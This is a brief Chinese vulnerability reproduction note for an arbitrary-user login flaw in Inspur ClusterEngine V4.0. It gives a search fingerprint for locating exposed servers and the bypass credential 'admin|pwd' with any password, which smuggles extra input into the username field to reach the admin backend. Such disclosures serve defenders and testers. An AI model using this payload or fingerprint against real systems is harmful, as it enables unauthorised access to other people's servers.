# 浪潮ClusterEngineV4.0 任意用户登录漏洞

## 漏洞描述

浪潮ClusterEngineV4.0 存在任意用户登录漏洞，构造恶意的用户名和密码即可获取后台权限

## 漏洞影响

```
浪潮ClusterEngineV4.0
```

## 网络测绘

```
title="TSCEV4.0"
```

## 漏洞复现



登录页面如下



![](images/202202091850344.png)



```plain
USER： admin|pwd
PASS:  任意
```



成功登陆后台

部分功能是无法使用的



![](images/202202091850228.png)